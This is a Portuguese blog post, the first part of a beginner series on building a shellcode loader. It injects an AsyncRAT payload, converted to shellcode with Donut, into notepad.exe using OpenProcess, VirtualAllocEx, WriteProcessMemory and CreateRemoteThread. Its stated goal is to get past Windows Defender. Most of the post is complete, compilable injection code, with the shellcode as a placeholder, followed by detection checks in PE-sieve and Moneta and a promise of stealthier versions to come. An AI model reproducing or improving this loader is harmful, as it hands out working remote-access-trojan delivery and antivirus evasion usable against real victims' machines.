---
weight: 12
title: "Post XII: Criando Um Carregador Simples Part-1"
date: 2024-07-22T15:58:26+08:00
lastmod: 2024-07-22T15:58:26+08:00
draft: false
author: Vith0r
authorLink: https://github.com/Vith0r
description: Reverse Shell Simples.
images: 
resources:
  - name: featured-image
    src: Image.jpeg
tags:
  - Malware
categories:
  - Malware
lightgallery: true
toc:
  auto: false
---

Bom, neste post vamos criar um shellcode loader simples, esse post é mais focado para iniciantes.

## Começo

Bom, vamos começar a fazer um carregador simples e entender os princípios básicos por trás do que estamos fazendo. Primeiro, vamos criar um código simples que provavelmente será detectado como um vírus. Em seguida, vamos começar a melhorar nosso código simples para que possamos contornar o **Windows Defender**.

> [!warning] Warning
> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.
## Conversão
Bom, primeiro vamos ter que utilizar algum programa para infectar o computador. Então, vou utilizar o [AsyncRAT](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp), por ser uma ferramenta de código aberto e de fácil entendimento, podendo ser executado no Windows. Como o AsyncRAT não tem a capacidade de criar uma payload em formato binário, podemos utilizar o projeto do [Donut](https://github.com/TheWover/donut) para transformar a payload gerada pelo AsyncRAT em um binário.<br> Caso queira ver mais sobre, leia meu post `DLL-LOADER`.
## Shellcode
O motivo pelo qual queremos transformar nosso executável em binário é porque nosso carregador vai injetar esse binário na memória de um processo. O principal objetivo pelo qual vamos fazer isso é que não vamos estar "deixando" nosso malware no disco, já que ele vai estar na memória do programa.
## Começo do código
A primeira parte do nosso código vai ser responsável por pegar o nome do executável fornecido no código e obter o PID (Process ID) do processo com esse nome:

```cpp
DWORD GetProcessIdByName(const wchar_t* processName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32W processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(snapshot, &processEntry))
		{
			do
			{
				if (wcscmp(processEntry.szExeFile, processName) == 0)
				{
					CloseHandle(snapshot);
					return processEntry.th32ProcessID;
				}
			} while (Process32NextW(snapshot, &processEntry));
		}
	}

	CloseHandle(snapshot);
	return 0;
}
```

Explicando `GetProcessIdByName`:

`CreateToolhelp32Snapshot`: Cria um snapshot de todos os processos em execução no sistema.<br> O argumento `TH32CS_SNAPPROCESS` indica que queremos capturar informações sobre processos.
`Process32FirstW`: Esta função retorna o primeiro processo no snapshot.
`Process32NextW`: Itera sobre o próximo processo no snapshot.
`wcscmp`: Compara os nomes dos processos para verificar se encontramos o processo desejado.
`CloseHandle`: Fecha o snapshot depois de encontrar o processo ou quando terminamos de iterar.
Essa função retorna o PID do processo que corresponder ao nome fornecido.
## APIs Importantes
Vamos agora explicar algumas APIs essenciais usadas no nosso carregador.<br> caso queira ver mais sobre as APIs utilizadas por malwares acesse [Malapi.io](https://malapi.io/).
### [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)

```cpp
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
```

`dwDesiredAccess`: O nível de acesso desejado ao processo. No nosso caso, usaremos `PROCESS_ALL_ACCESS` para ter permissão total.
`bInheritHandle`: Se definido como `FALSE`, o handle não pode ser herdado pelos processos filhos.
`dwProcessId`: O PID do processo que obtivemos com a função `GetProcessIdByName`.
No nosso código, isso nos permite abrir um processo de destino para injetar o shellcode.
### [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)

```cpp
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

`hProcess`: O handle do processo no qual queremos alocar memória. Esse handle é obtido com `OpenProcess`.
`lpAddress`: O endereço inicial da região de memória. Se NULL, o sistema escolhe o endereço.
`dwSize`: O tamanho da memória que queremos alocar.
`flAllocationType`: Tipo de alocação. Utilizamos `MEM_RESERVE | MEM_COMMIT` para reservar e comprometer a memória.
`flProtect`: Proteção de acesso para a memória. Vamos usar `PAGE_EXECUTE_READWRITE` para permitir leitura, escrita e execução.
### [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

```cpp
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

`hProcess`: O handle do processo no qual queremos escrever.
`lpBaseAddress`: O endereço de memória onde o conteúdo será escrito (obtido de `VirtualAllocEx`).
`lpBuffer`: O buffer contendo o que queremos escrever, no caso, o shellcode.
`nSize`: O tamanho do buffer.
`lpNumberOfBytesWritten`: Opcional, aponta para o número de bytes escritos na memória. Pode ser `NULL` se não for necessário verificar.

## [VirtualProtect](https://learn.microsoft.com/pt-br/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)

```cpp
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

`lpAddress`: O endereço da memória cuja proteção queremos alterar.
`dwSize`: O tamanho da região de memória.<br>
`flNewProtect`: A nova proteção para a memória.<br> Para execução, usamos `PAGE_EXECUTE_READ`.
`lpflOldProtect`: Um ponteiro para armazenar a antiga proteção da memória.

### [CreateRemoteThreadEx](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex)

```cpp
HANDLE CreateRemoteThreadEx(
  [in]            HANDLE                       hProcess,
  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
  [in]            SIZE_T                       dwStackSize,
  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
  [in, optional]  LPVOID                       lpParameter,
  [in]            DWORD                        dwCreationFlags,
  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [out, optional] LPDWORD                      lpThreadId
);
```

`hProcess`: O handle do processo no qual a thread será criada.
`lpThreadAttributes`: Atributos de segurança, podemos deixar `NULL`.
`dwStackSize`: O tamanho da pilha da thread, deixar `0` para o tamanho padrão.
`lpStartAddress`: O endereço inicial onde a execução da thread começa (neste caso, o shellcode).
`lpParameter`: Parâmetros passados para a thread, geralmente `NULL` para shellcode.
`dwCreationFlags`: Definir para `0` para que a thread inicie imediatamente.
`lpThreadId`: Um ponteiro para receber o ID da thread, pode ser `NULL`.
## Clássico loader

Então nosso código vai praticamente realizar isso:

Abrir o processo alvo com `OpenProcess`<br>
Alocar uma região de memória com permissões de leitura e gravação `VirtualAllocEx`
Copie o shellcode para essa região `WriteProcessMemory`
Alterar permissões da região de memória para leitura-execução `VirtualProtectEx`
Execute o shellcode `CreateRemoteThread`

Há muitas variações dessa receita simples, a maioria delas foca na injeção de shellcode em processos remotos.
Que funciona da mesma forma usando `OpenProcess()` no processo de destino, e usa isso como `hProcess` argumento para as chamadas de função como `VirtualAllocEx`,
O acesso entre processos usando `hProcess` é mais monitorado.
Outra coisa típica que está sendo feita é chamar o shellcode criando uma nova thread. Seja dentro do `CreateThread()` seu próprio espaço de endereço, ou `CreateRemoteThread()`
para injeção de processo.

Como nosso objetivo nesse post vai ser entender esse processo, então vamos ver cada um dos passos que vamos tomar com muita calma.
## Código:

Primeiro, vamos incluir as bibliotecas necessárias para nosso código, que vão ser:

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
```

```cpp
// Aqui podemos colar nossa shellcode copiada como C
unsigned char shellcode[] = { ...SHELLCODE... };
```

Depois, fornecemos o código do `GetProcessIdByName` que será responsável por pegar o nome do executável fornecido pelo código e obter o PID (Process ID) do processo com esse nome.

```cpp
DWORD GetProcessIdByName(const wchar_t* processName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32W processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(snapshot, &processEntry))
		{
			do
			{
				if (wcscmp(processEntry.szExeFile, processName) == 0)
				{
					CloseHandle(snapshot);
					return processEntry.th32ProcessID;
				}
			} while (Process32NextW(snapshot, &processEntry));
		}
	}

	CloseHandle(snapshot);
	return 0;
}
```

E, por último, nosso código `main`, que será responsável por todo o trabalho. Lembrando que é uma boa prática, ao criar um código, observar o processo dele mais a fundo. Para isso, vamos colocar "pontos de interrupção" para ter que pressionar Enter para realizar cada etapa do código. Além disso, vamos imprimir no nosso console o endereço de memória alocado e também imprimir o endereço de onde nosso shellcode foi escrito.

```cpp
int main()
{
    try
    {
        // Aqui definimos o nome do processo que vamos querer injetar nossa shellcode.
        const wchar_t* processName = L"notepad.exe";
        DWORD processId = GetProcessIdByName(processName);

        std::cout << "Processo encontrado com PID: " << processId << std::endl;
        std::cout << "Presione Enter para abrir o processo alvo." << std::endl;
        std::cin.get(); // Espera o usuário pressionar Enter

        if (processId == 0)
        {
            std::cout << "Processo nao encontrado." << std::endl;
            std::cin.get(); // Espera o usuário pressionar Enter
            return 1;
        }

        // Aqui abrimos o processo escolhido
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (hProcess == NULL)
        {
            std::cout << "Nao foi possivel abrir o processo." << std::endl;
            std::cin.get(); // Espera o usuário pressionar Enter
            return 1;
        }

        std::cout << "Presione Enter para alocar memoria para a shellcode." << std::endl;
        std::cin.get(); // Espera o usuário pressionar Enter

        // Aqui alocamos memoria suficiente para nosso shellcode na memoria do processo alvo
        LPVOID pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (pShellcode == NULL)
        {
            std::cout << "Falha ao alocar memoria." << std::endl;
            std::cin.get(); // Espera o usuário pressionar Enter
            return 1;
        }

        // Mostra o endereço de onde foi alocada a memória
        std::cout << "Memoria alocada em: " << pShellcode << std::endl;

        std::cout << "Presione Enter para escrever a shellcode na memoria." << std::endl;
        std::cin.get(); // Espera o usuário pressionar Enter

        // Aqui escrevemos nossa shellcode na memoria alocada do processo alvo
        if (!WriteProcessMemory(hProcess, pShellcode, shellcode, sizeof(shellcode), NULL))
        {
            std::cout << "Falha ao escrever na memoria." << std::endl;
            std::cin.get(); // Espera o usuário pressionar Enter
            return 1;
        }

        // Mostra o endereço onde o shellcode foi escrito
        std::cout << "Shellcode escrito em: " << pShellcode << std::endl;

        std::cout << "Presione Enter para criar a thread remota." << std::endl;
        std::cin.get(); // Espera o usuário pressionar Enter

        // Aqui criamos uma thread remota para iniciar nossa shellcode na memoria do processo alvo
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0, NULL);
        if (hThread == NULL)
        {
            std::cout << "Falha ao criar thread remota." << std::endl;
            std::cin.get(); // Espera o usuário pressionar Enter
            return 1;
        }

        std::cout << "Presione Enter para aguardar o termino da thread." << std::endl;
        std::cin.get(); // Espera o usuário pressionar Enter

        // Aqui estamos aguardando o término da thread que criamos para iniciar o shellcode
        WaitForSingleObject(hThread, INFINITE);

        std::cout << "Presione Enter para fechar o handle da thread e liberar a memoria." << std::endl;
        std::cin.get(); // Espera o usuário pressionar Enter

        // E aqui após ter terminado o thread que criamos vamos estyar fechando o handle do processo e limpando a memoria
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);

        std::cout << "Processo finalizado com sucesso." << std::endl;
        std::cin.get(); // Espera o usuário pressionar Enter
        return 0;
    }
    catch (const std::exception& e)
    {
        std::cout << "Ocorreu uma excecao: " << e.what() << std::endl;
        std::cin.get(); // Espera o usuário pressionar Enter
        return 1;
    }
}
```
## Analisando o Processo
Vamos estar utilizando os seguintes programas: [x64dbg](https://x64dbg.com/), [Detect-It-Easy](https://github.com/horsicq/Detect-It-Easy), [Pe-sieve](https://github.com/hasherezade/pe-sieve), [Moneta](https://github.com/forrest-orr/moneta).
### Detect-It-Easy
Após ter compilado nosso código, vamos jogar nosso executável gerado no `Detect-It-Easy` para ver algumas coisas interessantes.

lembrese de que `unsigned char shellcode[999]` é uma variável global inicializada, portanto, ela reside na seção `.data`.

![](https://i.imgur.com/bzOvLX5.gif)

Observe que o `Detect-It-Easy` nos mostra que a seção `.data` esta comprimida isso ocorre pois nossa shellcode é muito grande e esta localizada na seção `.data`, mas nossa entropia esta abaixo de 6 o que já é algo bom mas não perfeito.
Outra coisa que o `Detect-It-Easy` nos mostra é que o executavel importa algumas APIs como `OpenProcess` `VirtualAllocEx`... o que não é bom já que estamos mostrando que nosso executavel utiliza APIs tipicas em um shellcode loader.

Agora vamos abrir o `notepad.exe` e nosso loader para inspecionar a shellcode sendo escrita na memória. Para isso, vamos utilizar o `x64dbg`. Poderíamos ter definido pontos de interrupção no `x64dbg` para visualizar melhor as coisas, mas vou deixar isso para você fazer.

![](https://i.imgur.com/PXCdx2s.gif)

Como podemos ver, após ele nos entregar o endereço de onde a memória foi alocada, conseguimos visualizar esse endereço antes mesmo que a shellcode seja escrita. Podemos ver que a shellcode foi escrita com sucesso. Poderíamos realizar também um dump dessa memória para conseguir visualizar perfeitamente o shellcode que foi escrito.
Vamos ver o que as ferramentas `Pe-sieve` e `Moneta` nos entregam se analisarmos o processo do `notepad.exe` após realizar a injeção de shellcode.

![](https://i.imgur.com/UsVysuH.gif)

Observe que houve uma detecção bem grande, principalmente na parte do Moneta, onde ele detectou várias alterações. Isso ocorreu devido ao `donut`, já que ele, por padrão, realiza várias coisas como:

![](https://i.imgur.com/muT0QAD.png)

Podemos, claro, configurar o Donut, mas não vai mudar muita coisa. Então, vou optar por utilizar o [HavocFramework](https://github.com/HavocFramework/Havoc), já que não vamos ter uma detecção grande como a do `donut`.
## Continuação
Bom, por enquanto, foi apenas isso. No próximo post, vamos mudar e melhorar esse código drasticamente. Então, vá para o post: [[creating-simple-loader-2]]